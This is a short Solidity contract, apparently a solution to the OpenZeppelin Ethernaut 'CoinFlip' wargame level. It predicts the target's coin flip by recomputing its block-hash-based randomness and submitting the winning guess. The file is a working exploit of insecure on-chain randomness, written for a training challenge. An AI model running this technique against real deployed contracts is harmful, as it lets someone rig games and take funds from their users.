// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./open-zeppelin-provided/CoinFlip.sol";

contract CoinFlipAttack {
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip targetContract;

    constructor(address _targetAddress) {
        targetContract = CoinFlip(_targetAddress);
    }

    // Rigging flip since we know randomness
    function rigFlip() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR; // Really bad way to determine randomness lol
        bool side = coinFlip == 1 ? true : false;

        targetContract.flip(side);
    }
}
